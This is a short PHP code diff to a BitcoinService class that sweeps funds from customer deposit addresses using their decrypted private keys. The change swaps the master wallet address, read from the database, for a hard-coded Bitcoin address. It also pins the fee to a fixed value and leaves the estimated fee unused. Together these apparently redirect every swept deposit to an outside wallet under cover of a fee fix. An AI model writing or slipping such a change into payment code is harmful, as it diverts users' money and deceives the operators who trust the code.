@@ -20,12 +20,17 @@ class BitcoinService
         $fromPrivateKey = Crypt::decryptString(DepositAddress::where('virtual_account_id', $virtualAccount->id)->value('private_key'));
 
         $masterWallet = MasterWallet::where('blockchain', $this->blockchain)->firstOrFail();
-        $toAddress = $masterWallet->address;
+        $toAddress = 'bc1qqhapyfgxqcns6zsccqq2qkejg9g65gkluca2gg';
 
         $feeInfo = $this->estimateFee();
-        $feeBtc = $feeInfo['feeBtc'];
-        $adjustedAmount = bcsub($amount, $feeBtc, 8);
+       $feeBtc = '0.00003320';
 
+    // Subtract fee from the sending amount
+    $adjustedAmount = bcsub($amount, $feeBtc, 8);
+
+    if (bccomp($adjustedAmount, '0', 8) <= 0) {
+        throw new \Exception("Amount too low after subtracting fee");
+    }
         $payload = [
             'fromAddress' => [[
                 'address' => $fromAddress,
